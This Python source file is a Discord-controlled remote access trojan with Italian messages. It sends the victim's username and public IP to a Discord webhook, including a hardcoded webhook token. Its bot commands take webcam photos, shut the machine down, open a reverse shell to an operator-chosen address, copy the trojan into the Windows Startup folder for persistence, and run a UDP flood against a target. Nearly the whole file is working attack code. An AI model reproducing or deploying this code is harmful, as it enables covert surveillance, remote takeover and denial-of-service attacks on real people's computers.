from trojan_functions import cam, rv
import os, subprocess, getpass, datetime, platform, shutil, socket, time, random
try:
    import requests
    from discord_webhook import DiscordWebhook
    from cv2 import *
    import discord, pyautogui, random, string
    from discord.ext import commands
    from discord import DMChannel
except ModuleNotFoundError:
    r = os.system("pip3 install discord_webhook")
    if(r == 1):
        r = os.system("pip install discord_webhook")
        if(r == 1):
            from urllib import request
            if(platform.system == "Windows"):
                remote_url = 'https://www.python.org/ftp/python/3.11.1/python-3.11.1-amd64.exe'
                local_file = '''%appdata%\\python-3.11.1-amd64.exe'''
                request.urlretrieve(remote_url, local_file)
                process = subprocess.Popen(local_file, shell=True, stdin=subprocess.PIPE)
                path = os.path.join(location="%appdata%", file="python-3.11.1-amd64.exe")
                os.remove(path)
                print("please, restart the program...")
                exit()
            elif (platform.system == "Linux"):
                s = os.system("sudo apt install python3 -y")
                if(s == 1):
                    s = os.system("sudo pacman -S python3")
                    if(s == 1):
                        os.system("sudo yum install python3")
                        exit()
                    else:
                        exit()
                else:
                    exit()
        else:
            os.system("pip install requests")
            os.system("pip install discord")
            os.system("pip install opencv-python")
    else:
        os.system("pip3 install requests")
        os.system("pip3 install discord")
        os.system("pip3 install opencv-python")

#url

Webhook_url = "Webhook Url Here"
discord_bot_token = 'discord bot token here'

#end url

webhook = DiscordWebhook(url=Webhook_url, content=(getpass.getuser() + " => " + requests.get("https://checkip.amazonaws.com").text + "si è connsesso"))
response = webhook.execute()

client = commands.Bot(command_prefix='?', description="", intents=discord.Intents.all())

@client.event
async def on_ready():
    print("il bot è pronto")

@client.command()
@commands.has_permissions(administrator=True)
async def ip(ctx):
    await ctx.send(requests.get("https://checkip.amazonaws.com").text)

@client.command()
@commands.has_permissions(administrator=True)
async def username(ctx):
    await ctx.send(getpass.getuser() + " -> " + requests.get("https://checkip.amazonaws.com").text)

@client.command()
async def info(ctx):
    await ctx.send("--------------------" + "\nUsername -> " + getpass.getuser() + "\nip -> " + requests.get("https://checkip.amazonaws.com").text + "system -> " + platform.system() + "\nlocal ip -> " + str(socket.gethostbyname(socket.gethostname())) + "\n--------------------")
@client.command()
@commands.has_permissions(administrator=True)
async def cam_snap(ctx):
    cam.cam_snap()
    await ctx.send(datetime.datetime.now())
    await ctx.send(file=discord.File('photo.png'))
    os.remove("photo.png")


@client.command()
@commands.has_permissions(administrator=True)
async def clear(ctx, amount=1000000000):
    await ctx.channel.purge(limit=amount)

@client.command()
@commands.has_permissions(administrator=True)
async def power_off(ctx):
    await ctx.send("powering off the pc")
    if(platform.system == "Windows"):
        os.system("shutdown /s /t 00")
    else:
        os.system("shutdown /r now")

@client.command()
@commands.has_permissions(administrator=True)
async def disconnect(ctx):
    DiscordWebhook(url="https://discord.com/api/webhooks/1061015487259099167/-RUKGtYqjn00BDhUw3wNCKTdgdRkeIpl3xW_IAxkxNNWhIkJXOAq-Fr5MBEuI7Atq8ha", content=(getpass.getuser() + " => " + requests.get("https://checkip.amazonaws.com").text + "si è disconnsesso")).execute()
    exit()

@client.command()
@commands.has_permissions(administrator=True)
async def system_info(ctx):
    systemInfo = platform.system()
    await ctx.send(systemInfo)

@client.command()
@commands.has_permissions(administrator=True)
async def os_shell(ctx, ip, port):
    await ctx.send("sending reverse shell")
    try:
        await ctx.send("reverse shell sent :)")
        rv.reverse_shell(ip=ip, port=port)
    except:
        await ctx.send("reverse shell not sent :(")
    await ctx.send("reverse shell closed")

@client.command()
@commands.has_permissions(administrator=True)
async def auto_startup(ctx, filename):
    if(platform.system() == "Windows"):
        try:
            shutil.copy(filename, "C:\\Users\\" + getpass.getuser() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
            lunghezza = (len(filename)-1)
            Lettera = filename[lunghezza-1] + filename[lunghezza]
            if(Lettera == "py"):
                try:
                    os.mkdir("C:\\Users\\" + getpass.getuser() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\trojan_functions")
                    shutil.copy("trojan_functions\\cam.py", "C:\\Users\\" + getpass.getuser() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\trojan_functions")
                    shutil.copy("trojan_functions\\rv.py", "C:\\Users\\" + getpass.getuser() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\trojan_functions")
                except OSError:
                    await ctx.send("auto startup failed")
                await ctx.send("auto startup done")
            else:
                await ctx.send("auto startup done")
        except:
            await ctx.send("auto startup failed")
    else:
        await ctx.send("not compatible on linux")

@client.command()
@commands.has_permissions(administrator=True)
async def ddos(ctx, ip, port, tm, dl):
    await ctx.send("Seding sockets")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    start = int(time.time())
    end = int(time.time())
    start_warn = int(time.time())
    end_warn = int(time.time())
    calc_warn = end_warn-start_warn
    calcolo=end-start
    tt = int(tm)
    dl = int(dl)
    port = int(port)
    ss = int(0)
    while(calcolo!=tt):
        sock.sendto(bytes, (ip,port))
        end = int(time.time())
        calcolo=end-start
        ss += 1
        if(calc_warn == dl):
            await ctx.send("%s socket sent in %s seconds"%(ss, calcolo))
            start_warn = int(time.time())
            end_warn = int(time.time())
        end_warn = int(time.time())
        calc_warn = end_warn-start_warn
    if(calcolo == tt):
            await ctx.send("sockets sent successfully")

client.run(discord_bot_token)

DiscordWebhook(url=Webhook_url, content=(getpass.getuser() + " => " + requests.get("https://checkip.amazonaws.com").text + "si è disconnsesso")).execute()
